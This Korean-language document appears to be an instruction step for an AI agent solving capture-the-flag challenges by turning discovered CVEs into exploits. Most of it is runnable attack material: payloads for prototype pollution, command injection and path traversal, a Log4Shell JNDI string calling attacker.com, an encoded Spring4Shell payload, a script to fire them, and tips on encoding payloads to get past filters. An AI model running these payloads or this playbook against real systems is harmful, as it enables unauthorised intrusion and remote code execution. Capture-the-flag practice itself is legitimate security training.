# Step 2: CVE 기반 공격 전략 수립

## 전제 조건
- Step 1에서 CVE가 발견된 경우에만 실행
- 발견된 CVE 목록 보유

## 목표
발견된 CVE를 실제 익스플로잇 가능한 공격 코드로 전환

## 실행 프로세스

### 2.1 CVE 우선순위 결정

#### 우선순위 기준
1. **심각도**: Critical > High > Medium
2. **RCE 가능성**: Remote Code Execution 가능 CVE 최우선
3. **인증 불필요**: Authentication bypass 또는 pre-auth 취약점
4. **정보 유출**: Information disclosure 취약점
5. **알려진 익스플로잇**: 공개된 PoC 존재 여부

### 2.2 익스플로잇 코드 생성

#### 전략 A: 알려진 CVE 패턴
**일반적인 Node.js CVE 익스플로잇 패턴**

```python
# Prototype Pollution (CVE-2019-XXXXX 계열)
exploit_patterns = {
    "prototype_pollution": {
        "payload": '{"__proto__":{"isAdmin":true}}',
        "target": "/api/user/update"
    },
    "command_injection": {
        "payload": "; cat /flag.txt",
        "target": "/api/exec"
    },
    "path_traversal": {
        "payload": "../../../../flag.txt",
        "target": "/api/file"
    }
}
```

#### 전략 B: CVE 특화 공격
**도구**: `dreamhack_solver:execute_command`를 통한 스크립트 생성 및 실행

```bash
# 익스플로잇 스크립트 생성
cat > exploit.py << 'EOF'
import requests
import json

target = "{target_url}"
cve = "{cve_number}"

# CVE별 특화 페이로드
payloads = {
    "CVE-2021-44228": "${jndi:ldap://attacker.com/a}",
    "CVE-2022-22965": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B%73%79%73%74%65%6D%28%22%63%61%74%20%2F%66%6C%61%67%2E%74%78%74%22%29%7D",
    # 추가 CVE 패턴...
}

# 익스플로잇 실행
if cve in payloads:
    response = requests.post(target, data=payloads[cve])
    print(response.text)
EOF

python3 exploit.py
```

### 2.3 익스플로잇 실행 및 검증

#### 실행 단계
1. **페이로드 준비**: CVE에 맞는 페이로드 구성
2. **타겟 확인**: 취약한 엔드포인트 식별
3. **공격 실행**: curl 또는 스크립트로 공격
4. **결과 확인**: 플래그 패턴 검색

#### 실행 명령
```bash
# Direct curl attack
dreamhack_solver:curl(
    target_url="{url}/vulnerable_endpoint",
    method="POST",
    data="{exploit_payload}",
    content_type="application/json"
)

# Script-based attack
dreamhack_solver:execute_command(
    command="python3 exploit.py"
)
```

## 결과 처리

### 성공 시
```json
{
  "step": "2_cve_exploitation",
  "status": "SUCCESS",
  "cve_used": "CVE-XXXX-XXXXX",
  "exploit_method": "prototype_pollution|command_injection|etc",
  "flag": "flag{...}",
  "next_action": "Step4_Validation"
}
```

### 실패 시
```json
{
  "step": "2_cve_exploitation",
  "status": "FAILURE",
  "attempted_cves": ["CVE-1", "CVE-2"],
  "failure_reasons": [
    "Endpoint not vulnerable",
    "Payload filtered",
    "Version mismatch"
  ],
  "next_action": "Step3_Direct_Analysis"
}
```

## 대체 전략

### CVE는 있지만 직접 익스플로잇 실패 시
1. **변형 시도**: 페이로드 인코딩, 우회 기법
2. **체인 공격**: 여러 CVE 조합
3. **정보 수집**: CVE를 통한 정보 유출 후 재공격
4. **포기 및 전환**: 3회 실패 시 Step3로 이동

## 중요 고려사항

1. **시간 제한**: 각 CVE당 최대 5분 투자
2. **리소스 관리**: 과도한 요청으로 차단 방지
3. **로깅**: 모든 시도와 응답 기록
4. **적응성**: 응답에 따라 페이로드 동적 조정
